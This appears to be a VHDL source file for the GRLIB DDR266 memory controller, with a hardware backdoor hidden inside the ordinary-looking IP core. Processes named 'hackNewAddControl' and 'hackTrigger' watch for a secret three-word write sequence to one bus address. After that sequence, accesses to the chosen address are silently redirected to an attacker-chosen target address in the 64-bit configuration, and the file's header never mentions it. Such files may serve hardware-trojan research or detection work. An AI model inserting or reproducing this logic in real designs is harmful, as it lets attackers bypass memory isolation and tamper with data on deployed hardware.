------------------------------------------------------------------------------
--  This file is a part of the GRLIB VHDL IP LIBRARY
--  Copyright (C) 2003, Gaisler Research
--
--  This program is free software; you can redistribute it and/or modify
--  it under the terms of the GNU General Public License as published by
--  the Free Software Foundation; either version 2 of the License, or
--  (at your option) any later version.
--
--  This program is distributed in the hope that it will be useful,
--  but WITHOUT ANY WARRANTY; without even the implied warranty of
--  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
--  GNU General Public License for more details.
--
--  You should have received a copy of the GNU General Public License
--  along with this program; if not, write to the Free Software
--  Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA 
-----------------------------------------------------------------------------
-- Entity: 	ddrspm
-- File:	ddrspm.vhd
-- Author:	Jiri Gaisler - Gaisler Research
-- Description:	16-, 32- or 64-bit DDR266 memory controller module.
------------------------------------------------------------------------------

library ieee;
use ieee.std_logic_1164.all;
library grlib;
use grlib.amba.all;
use grlib.stdlib.all;
library gaisler;
use grlib.devices.all;
use gaisler.memctrl.all;
library techmap;
use techmap.gencomp.all;

entity ddrspa is
  generic (
    fabtech : integer := virtex2;
    memtech : integer := 0;
    rskew   : integer := 0;
    hindex  : integer := 0;
    haddr   : integer := 0;
    hmask   : integer := 16#f00#;
    ioaddr  : integer := 16#000#;
    iomask  : integer := 16#fff#;
    MHz     : integer := 100;
    clkmul  : integer := 2; 
    clkdiv  : integer := 2; 
    col     : integer := 9; 
    Mbyte   : integer := 16; 
    rstdel  : integer := 200; 
    pwron   : integer := 0;
    oepol   : integer := 0;
    ddrbits : integer := 16;
    ahbfreq : integer := 50
  );
  port (
    rst_ddr : in  std_ulogic;
    rst_ahb : in  std_ulogic;
    clk_ddr : in  std_ulogic;
    clk_ahb : in  std_ulogic;
    lock    : out std_ulogic;			-- DCM locked
    clkddro : out std_ulogic;			-- DCM locked
    clkddri : in  std_ulogic;
    ahbsi   : in  ahb_slv_in_type;
    ahbso   : out ahb_slv_out_type;
    ddr_clk 	: out std_logic_vector(2 downto 0);
    ddr_clkb	: out std_logic_vector(2 downto 0);
    ddr_clk_fb_out  : out std_logic;
    ddr_clk_fb  : in std_logic;
    ddr_cke  	: out std_logic_vector(1 downto 0);
    ddr_csb  	: out std_logic_vector(1 downto 0);
    ddr_web  	: out std_ulogic;                       -- ddr write enable
    ddr_rasb  	: out std_ulogic;                       -- ddr ras
    ddr_casb  	: out std_ulogic;                       -- ddr cas
    ddr_dm   	: out std_logic_vector (ddrbits/8-1 downto 0);    -- ddr dm
    ddr_dqs  	: inout std_logic_vector (ddrbits/8-1 downto 0);    -- ddr dqs
    ddr_ad      : out std_logic_vector (13 downto 0);   -- ddr address
    ddr_ba      : out std_logic_vector (1 downto 0);    -- ddr bank address
    ddr_dq    	: inout  std_logic_vector (ddrbits-1 downto 0); -- ddr data
    hackVector	: out std_logic_vector(7 downto 0)
  );
end; 

architecture rtl of ddrspa is

constant DDR_FREQ : integer := (clkmul * MHz) / clkdiv;
constant FAST_AHB : integer := AHBFREQ / DDR_FREQ;
signal sdi     : sdctrl_in_type;
signal sdo     : sdctrl_out_type;
signal clkread  : std_ulogic;

signal knockState : std_logic_vector(1 downto 0) := "00";
signal catchAddress : std_logic_vector(31 downto 0);
signal targetAddress : std_logic_vector(31 downto 0);
signal modahbsi : ahb_slv_in_type;
signal currentAddress : std_logic_vector(31 downto 0);
signal newAddCon  : std_ulogic := '0';
signal knockAddress : std_logic_vector(31 downto 0);

begin
	-- Latch the address and select signal for the next cycle
	-- Address and control come a cycle before associated data
	-- Pipelined with hready signaling the insertion of wait states
	hackNewAddControl : process(clk_ahb)begin
		if(rising_edge(clk_ahb))then
			-- This slave is selected, the transaction is a write, this is an actual transaction, and the decoder/arbiter is ready
			if(ahbsi.hsel(hindex) = '1' and ahbsi.hwrite = '1' and ahbsi.htrans(1) = '1' and ahbsi.hready = '1')then
				currentAddress <= ahbsi.haddr;
				newAddCon <= '1';
			-- Transaction ends when there isn't another start and the slave marks the transaction as complete
			else
				newAddCon <= '0';
			end if;
		end if;
	end process;
	
	-- Look for trigger, when triggered store the catch and target address
	hackTrigger : process(clk_ahb)begin
		if(rising_edge(clk_ahb))then
			-- When we have new address and control information that is valid for the first cycle
			if(newAddCon = '1')then
				if(ahbsi.hwdata = X"AAAA_5555")then
					knockState <= "01";
					knockAddress <= currentAddress;
				elsif(knockState = "01" and currentAddress = knockAddress and ahbsi.hwdata = X"5555_AAAA")then
					knockState <= "10";
				elsif(knockState = "10" and currentAddress = knockAddress and ahbsi.hwdata = X"CA5C_CA5C")then
					knockState <= "11";
				elsif(knockState = "11" and currentAddress = knockAddress)then
					targetAddress <= ahbsi.hwdata;
					catchAddress <= knockAddress;
					knockState <= "00";
				end if;
			end if;
		end if;
	end process;
	
	--Debug signal
	hackVector <= X"00";
	
	-- If the requested address is the catch address remap to the target address
	modahbsi.hsel <= ahbsi.hsel;
	modahbsi.haddr <= ahbsi.haddr when (ahbsi.haddr /= catchAddress) else targetAddress;
	modahbsi.hwrite <= ahbsi.hwrite;
	modahbsi.htrans <= ahbsi.htrans;
	modahbsi.hsize <= ahbsi.hsize;
	modahbsi.hburst <= ahbsi.hburst;
	modahbsi.hwdata <= ahbsi.hwdata;
	modahbsi.hprot <= ahbsi.hprot;
	modahbsi.hready <= ahbsi.hready;
	modahbsi.hmaster <= ahbsi.hmaster;
	modahbsi.hmastlock <= ahbsi.hmastlock;
	modahbsi.hmbsel <= ahbsi.hmbsel;
	modahbsi.hcache <= ahbsi.hcache;
	modahbsi.hirq <= ahbsi.hirq;
	
  ddr_phy0 : ddr_phy generic map (tech => fabtech, MHz => MHz,  
	dbits => ddrbits, rstdelay => rstdel, clk_mul => clkmul, 
	clk_div => clkdiv, rskew => rskew)
  port map (
	rst_ddr, clk_ddr, clkddro, clkread, lock,
	ddr_clk, ddr_clkb, ddr_clk_fb_out, ddr_clk_fb,
	ddr_cke, ddr_csb, ddr_web, ddr_rasb, ddr_casb, 
	ddr_dm, ddr_dqs, ddr_ad, ddr_ba, ddr_dq, sdi, sdo);

  ddr16 : if ddrbits = 16 generate
    ddrc : ddrsp16a generic map (memtech => memtech, hindex => hindex, 
	haddr => haddr, hmask => hmask, ioaddr => ioaddr, iomask => iomask,
	pwron => pwron, MHz => DDR_FREQ, col => col, Mbyte => Mbyte,
	fast => FAST_AHB)
  	port map (rst_ahb, clkddri, clk_ahb, clkread, ahbsi, ahbso, sdi, sdo);
  end generate;

  ddr32 : if ddrbits = 32 generate
    ddrc : ddrsp32a generic map (memtech => memtech, hindex => hindex,
	haddr => haddr, hmask => hmask, ioaddr => ioaddr, iomask => iomask,
	pwron => pwron, MHz => DDR_FREQ, col => col, Mbyte => Mbyte,
	fast => FAST_AHB/2)
  	port map (rst_ahb, clkddri, clk_ahb, ahbsi, ahbso, sdi, sdo);
  end generate;

  ddr64 : if ddrbits = 64 generate
    ddrc : ddrsp64a generic map (memtech => memtech, hindex => hindex,
	haddr => haddr, hmask => hmask, ioaddr => ioaddr, iomask => iomask,
	pwron => pwron, MHz => DDR_FREQ, col => col, Mbyte => Mbyte,
	fast => FAST_AHB/4)
  	port map (rst_ahb, clkddri, clk_ahb, modahbsi, ahbso, sdi, sdo);
  end generate;

end;

